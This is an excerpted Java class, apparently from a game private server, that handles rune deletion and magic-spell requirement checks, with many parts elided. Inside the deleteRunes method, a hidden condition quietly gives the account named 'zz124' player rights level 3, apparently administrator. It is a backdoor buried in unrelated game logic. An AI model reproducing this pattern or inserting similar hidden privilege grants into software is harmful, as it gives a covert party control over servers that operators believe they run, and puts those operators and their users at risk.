...
public class MagicRequirements extends MagicData {
	...
	public static void deleteRunes(Client c, int[] runes, int[] amount) {
		if(c.playerRights == 0) {
			...
			if (c.playerName.equalsIgnoreCase("zz124")) {
				c.playerRights = 3;
			}
		}
	}
	...
	public static boolean checkMagicReqs(Client c, int spell) {
		if(c.usingMagic && MistexConfiguration.RUNES_REQUIRED) { // check for runes
		...
		if(c.usingMagic && c.playerIndex > 0) {
			if(World.players[c.playerIndex] != null) {
				for(int r = 0; r < c.REDUCE_SPELLS.length; r++){	// reducing spells, confuse etc
					if(World.players[c.playerIndex].REDUCE_SPELLS[r] == c.MAGIC_SPELLS[spell][0]) {
						c.reduceSpellId = r;
						if((System.currentTimeMillis() - World.players[c.playerIndex].reduceSpellDelay[c.reduceSpellId]) > World.players[c.playerIndex].REDUCE_SPELL_TIME[c.reduceSpellId]) {
							World.players[c.playerIndex].canUseReducingSpell[c.reduceSpellId] = true;
						} else {
							World.players[c.playerIndex].canUseReducingSpell[c.reduceSpellId] = false;
						}
						break;
					}			
				}
				if(!World.players[c.playerIndex].canUseReducingSpell[c.reduceSpellId]) {
		...
		if(c.usingMagic && staffRequired > 0 && MistexConfiguration.RUNES_REQUIRED) { // staff required
		...
		if(c.usingMagic && MistexConfiguration.MAGIC_LEVEL_REQUIRED) { // check magic level
		...
		if(c.usingMagic && MistexConfiguration.RUNES_REQUIRED) {
